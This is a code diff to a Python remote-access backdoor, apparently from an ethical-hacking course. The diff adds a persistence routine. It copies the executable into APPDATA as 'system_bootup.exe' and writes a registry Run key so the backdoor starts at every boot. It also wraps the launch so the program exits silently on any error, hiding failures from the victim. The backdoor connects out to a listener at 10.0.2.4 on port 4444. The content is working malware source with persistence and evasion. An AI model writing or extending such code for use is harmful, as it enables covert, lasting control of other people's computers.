@@ -6,12 +6,21 @@ import json
 import os
 import base64 as b64
 import sys
+import shutil
 
 class Backdoor:
     def __init__(self,ip, port):
+        self.persistance()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # connection.connect(("10.0.2.4", 4444))
         self.connection.connect((ip, port))
+
+    def persistance(self):
+        backDoor_location = os.environ["appdata"] +"\\system_bootup.exe"
+        if( not os.path.exists(backDoor_location) ):
+            shutil.copyfile(sys.executable, backDoor_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v bootup /t REG_SZ /d "' 
+                            + backDoor_location + '"', shell=True)
 
     def send_json(self, data):
         json_data = json.dumps(data)
@@ -94,5 +103,9 @@ class Backdoor:
 
         self.connection.close()
 
-my_Backdoor = Backdoor("10.0.2.4", 4444)
-my_Backdoor.run()
+
+try:
+    my_Backdoor = Backdoor("10.0.2.4", 4444)
+    my_Backdoor.run()
+except Exception:
+    sys.exit()  #if program doesn't work, silently exit without displaying error
